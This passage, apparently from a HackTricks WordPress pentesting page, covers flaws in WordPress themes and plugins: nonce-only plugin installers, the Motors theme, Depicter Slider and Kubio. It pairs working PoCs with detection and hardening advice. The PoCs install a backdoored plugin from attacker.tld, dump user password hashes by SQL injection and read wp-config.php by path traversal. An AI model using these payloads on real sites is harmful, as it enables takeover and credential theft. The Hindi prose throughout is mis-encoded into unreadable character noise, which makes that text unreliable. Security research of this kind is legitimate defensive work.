Nonces CSRF рдХреЛ рд░реЛрдХрддреЗ рд╣реИрдВ, authorization рдХреЛ рдирд╣реАрдВред рдпрджрд┐ рдХреЛрдб nonce рдкрд╛рд╕ рдХреЛ рд╣рд░реА рдЭрдВрдбреА рдорд╛рдирддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ privileged operations (рдЙрджрд╛., install/activate plugins) рдХреЗ рд▓рд┐рдП capability checks рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИ, рддреЛ рдЕрдкреНрд░рдорд╛рдгреАрдХреГрдд рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдХрдордЬреЛрд░ nonce рдЖрд╡рд╢реНрдпрдХрддрд╛ рдкреВрд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ backdoored рдпрд╛ vulnerable plugin рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рдХреЗ RCE рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВред

- Vulnerable path: plugin/install_and_activate
- Flaw: рдХрдордЬрд╝реЛрд░ nonce hash рдЪреЗрдХ; nonce тАЬрдкрд╛рд╕тАЭ рд╣реЛрдиреЗ рдкрд░ current_user_can('install_plugins'|'activate_plugins') рд▓рд╛рдЧреВ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ
- Impact: arbitrary plugin install/activation рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреВрд░реНрдг рд╕рдордЭреМрддрд╛

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers рдЬреЛ plugins/themes рдХреЛ рдХреЗрд╡рд▓ wp_verify_nonce()/check_admin_referer() рдХреЗ рд╕рд╛рде рдмрджрд▓рддреЗ рд╣реИрдВ рдФрд░ рдХреЛрдИ capability рдЪреЗрдХ рдирд╣реАрдВ рдХрд░рддреЗ
- рдХреЛрдИ рднреА рдХреЛрдб рдкрд╛рде рдЬреЛ nonce validation рдХреЗ рдмрд╛рдж $skip_caps = true рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИ

Hardening
- рд╕рджреИрд╡ nonces рдХреЛ рдХреЗрд╡рд▓ CSRF tokens рдХреЗ рд░реВрдк рдореЗрдВ рдорд╛рдиреЗрдВ; nonce рдХреА рд╕реНрдерд┐рддрд┐ рдХреА рдкрд░рд╡рд╛рд╣ рдХрд┐рдП рдмрд┐рдирд╛ capability checks рд▓рд╛рдЧреВ рдХрд░реЗрдВ
- installer code рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ current_user_can('install_plugins') рдФрд░ current_user_can('activate_plugins') рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд░рдЦреЗрдВ
- unauthenticated access рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВ; privileged flows рдХреЗ рд▓рд┐рдП nopriv AJAX actions рдХреЛ рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░рдиреЗ рд╕реЗ рдмрдЪреЗрдВ

### Subscriber+ AJAX plugin installer тЖТ рдордЬрдмреВрд░рди рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рд╕рдХреНрд░рд┐рдпрдХрд░рдг (Motors Theme тЙд 5.6.81)

[Patchstack's analysis](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/) рдиреЗ рджрд┐рдЦрд╛рдпрд╛ рдХрд┐ Motors theme рдЕрдкрдиреЗ companion plugin рдХреЛ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ authenticated AJAX helper рд╢рд┐рдк рдХрд░рддрд╛ рд╣реИ:
```php
add_action('wp_ajax_mvl_theme_install_base', 'mvl_theme_install_base');

function mvl_theme_install_base() {
check_ajax_referer('mvl_theme_install_base', 'nonce');

$plugin_url  = sanitize_text_field($_GET['plugin']);
$plugin_slug = 'motors-car-dealership-classified-listings';

$upgrader = new Plugin_Upgrader(new Motors_Theme_Plugin_Upgrader_Skin(['plugin' => $plugin_slug]));
$upgrader->install($plugin_url);
mvl_theme_activate_plugin($plugin_slug);
}
```
- Only `check_ajax_referer()` is called; there is no `current_user_can('install_plugins')` or `current_user_can('activate_plugins')`.
- The nonce is embedded in the Motors admin page, so any Subscriber that can open `/wp-admin/` can copy it from the HTML/JS.
- The handler trusts the attacker-controlled `plugin` parameter (read from `$_GET`) and passes it into `Plugin_Upgrader::install()`, so an arbitrary remote ZIP is downloaded into `wp-content/plugins/`.
- After installation the theme unconditionally calls `mvl_theme_activate_plugin()`, guaranteeing execution of the attacker plugin's PHP code.

#### рд╢реЛрд╖рдг рдкреНрд░рд╡рд╛рд╣

1. Register/compromise a low-privileged account (Subscriber is enough) and grab the `mvl_theme_install_base` nonce from the Motors dashboard UI.
2. Build a plugin ZIP whose top-level directory matches the expected slug `motors-car-dealership-classified-listings/` and embed a backdoor or webshell in the `*.php` entry points.
3. Host the ZIP and trigger the installer by pointing the handler to your URL:
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Cookie: wordpress_logged_in_=...
Content-Type: application/x-www-form-urlencoded

action=mvl_theme_install_base&nonce=<leaked_nonce>&plugin=https%3A%2F%2Fattacker.tld%2Fmotors-car-dealership-classified-listings.zip
```
рдХреНрдпреЛрдВрдХрд┐ handler `$_GET['plugin']` рдкрдврд╝рддрд╛ рд╣реИ, рд╡рд╣реА payload query string рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреА рднреЗрдЬрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

#### рдбрд┐рдЯреЗрдХреНрд╢рди рдЪреЗрдХрд▓рд┐рд╕реНрдЯ

- themes/plugins рдореЗрдВ `Plugin_Upgrader`, `Theme_Upgrader`, рдпрд╛ custom `install_plugin.php` helpers рдЦреЛрдЬреЗрдВ рдЬреЛ capability checks рдХреЗ рдмрд┐рдирд╛ `wp_ajax_*` hooks рд╕реЗ рдЬреБрдбрд╝реЗ рд╣реЛрдВред
- рдХрд┐рд╕реА рднреА handler рдХрд╛ рдирд┐рд░реАрдХреНрд╖рдг рдХрд░реЗрдВ рдЬреЛ `plugin`, `package`, `source`, рдпрд╛ `url` parameter рд▓реЗрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ upgrader APIs рдореЗрдВ feed рдХрд░рддрд╛ рд╣реИ, рдЦрд╛рд╕рдХрд░ рдЬрдм slug hard-coded рд╣реЛ рдкрд░ ZIP contents validate рдирд╣реАрдВ рдХреА рдЬрд╛рддреАрдВред
- installer actions рдХреЗ рд▓рд┐рдП nonces expose рдХрд░рдиреЗ рд╡рд╛рд▓реЗ admin pages рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░реЗрдВтАФрдпрджрд┐ Subscribers рдкреЗрдЬ рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдорд╛рдиреЗрдВ рдХрд┐ nonce leak рд╣реЛрддрд╛ рд╣реИред

#### рд╣рд╛рд░реНрдбрдирд┐рдВрдЧ

- installer AJAX callbacks рдХреЛ nonce verification рдХреЗ рдмрд╛рдж `current_user_can('install_plugins')` рдФрд░ `current_user_can('activate_plugins')` рд╕реЗ gate рдХрд░реЗрдВ; Motors 5.6.82 рдиреЗ рдЗрд╕ рдЪреЗрдХ рдХреЛ рдмрдЧ рдкреЕрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП introduce рдХрд┐рдпрд╛ред
- untrusted URLs рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВ: installers рдХреЛ bundled ZIPs рдпрд╛ trusted repositories рддрдХ рд╕реАрдорд┐рдд рдХрд░реЗрдВ, рдпрд╛ signed download manifests рд▓рд╛рдЧреВ рдХрд░реЗрдВред
- nonces рдХреЛ рд╕рдЦреНрддреА рд╕реЗ CSRF tokens рдХреЗ рд░реВрдк рдореЗрдВ рдорд╛рдиреЗрдВ; рд╡реЗ authorization рдкреНрд░рджрд╛рди рдирд╣реАрдВ рдХрд░рддреЗ рдФрд░ рдХрднреА capability checks рдХреА рдЬрдЧрд╣ рдирд╣реАрдВ рд▓реЗрдиреЗ рдЪрд╛рд╣рд┐рдПред

---

## Unauthenticated SQLi depicter-* actions рдореЗрдВ s (search) parameter рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ (Depicter Slider тЙд 3.6.1)

Multiple depicter-* actions рдиреЗ s (search) parameter рдХреЛ consume рдХрд┐рдпрд╛ рдФрд░ рдЗрд╕реЗ parameterization рдХреЗ рдмрд┐рдирд╛ SQL queries рдореЗрдВ concatenated рдХрд░ рджрд┐рдпрд╛ред

- Parameter: s (search)
- Flaw: direct string concatenation in WHERE/LIKE clauses; no prepared statements/sanitization
- Impact: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- Grep рдХреЗ рд▓рд┐рдП depicter-* action handlers рдФрд░ SQL рдореЗрдВ $_GET['s'] рдпрд╛ $_POST['s'] рдХрд╛ рд╕реАрдзреЗ рдЙрдкрдпреЛрдЧ рдЦреЛрдЬреЗрдВ
- $wpdb->get_results()/query() рдХреЛ рдкрд╛рд╕ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ custom queries рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░реЗрдВ рдЬрд┐рдирдореЗрдВ s рдХреЛ concatenate рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ

Hardening
- рд╣рдореЗрд╢рд╛ $wpdb->prepare() рдпрд╛ wpdb placeholders рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ; рдЕрдирдкреЗрдХреНрд╖рд┐рдд рдореЗрдЯрд╛-рдХреИрд░реЗрдХреНрдЯрд░реНрд╕ рдХреЛ server-side рдкрд░ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВ
- s рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рдЦреНрдд allowlist рдЬреЛрдбрд╝реЗрдВ рдФрд░ рдЗрд╕реЗ рдЕрдкреЗрдХреНрд╖рд┐рдд charset/length рдХреЗ рдЕрдиреБрд╕рд╛рд░ рд╕рд╛рдорд╛рдиреНрдпреАрдХреГрдд рдХрд░реЗрдВ

---

## рдЕрдирдкреНрд░рдорд╛рдгреАрдХреГрдд Local File Inclusion via рд╕рддреНрдпрд╛рдкрд┐рдд рди рдХрд┐рдП рдЧрдП template/file path (Kubio AI Page Builder тЙд 2.5.1)

рдПрдХ template parameter рдореЗрдВ attacker-controlled paths рдХреЛ рдмрд┐рдирд╛ normalization/containment рдХреЗ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рд╕реЗ arbitrary local files рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИ, рдФрд░ рдХрднреА-рдХрднреА code execution рднреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЕрдЧрд░ includable PHP/log рдлрд╝рд╛рдЗрд▓реЗрдВ runtime рдореЗрдВ рдЦреАрдВрдЪ рд▓реА рдЬрд╛рдПрдБред

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: рдХреЛрдИ normalization/allowlisting рдирд╣реАрдВ; traversal рдХреА рдЕрдиреБрдорддрд┐
- Impact: secret disclosure (wp-config.php), рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╡рд╛рддрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ рд╕рдВрднрд╛рд╡рд┐рдд RCE (log poisoning, includable PHP)

PoC тАУ read wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рдЪреЗрдХрд▓рд┐рд╕реНрдЯ
- рдХреЛрдИ рднреА handler рдЬреЛ request paths рдХреЛ include()/require()/read sinks рдореЗрдВ рдЬреЛрдбрд╝рдХрд░ realpath() рджреНрд╡рд╛рд░рд╛ containment рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдирд╣реАрдВ рдХрд░рддрд╛
- рдирд┐рдпрдд templates directory рдХреЗ рдмрд╛рд╣рд░ рдкрд╣реБрдБрдЪрдиреЗ рд╡рд╛рд▓реЗ traversal рдкреИрдЯрд░реНрди (../) рдХреА рддрд▓рд╛рд╢ рдХрд░реЗрдВ

рд╣рд╛рд░реНрдбрдирд┐рдВрдЧ
- Allowlisted templates рдХреЛ рд▓рд╛рдЧреВ рдХрд░реЗрдВ; realpath() рд╕реЗ resolve рдХрд░реЗрдВ рдФрд░ require str_starts_with(realpath(file), realpath(allowed_base))
- рдЗрдирдкреБрдЯ рдХреЛ normalize рдХрд░реЗрдВ; traversal sequences рдФрд░ absolute paths рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВ; sanitize_file_name() рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреЗрд╡рд▓ filenames рдХреЗ рд▓рд┐рдП рдХрд░реЗрдВ (рдкреВрд░реНрдг paths рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ)


## рд╕рдВрджрд░реНрдн

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset тАУ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments тЙд 5.6.1 тАУ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation тАУ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025тАЩs most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) тЙд 1.0.82 тАУ Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations тЙд 3.5.3 тАУ Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider тЙд 3.6.1 тАУ Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder тЙд 2.5.1 тАУ Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)
- [Critical Arbitrary File Upload Vulnerability in Motors Theme Affecting 20k+ Sites](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/)

{{#include ../../banners/hacktricks-training.md}}
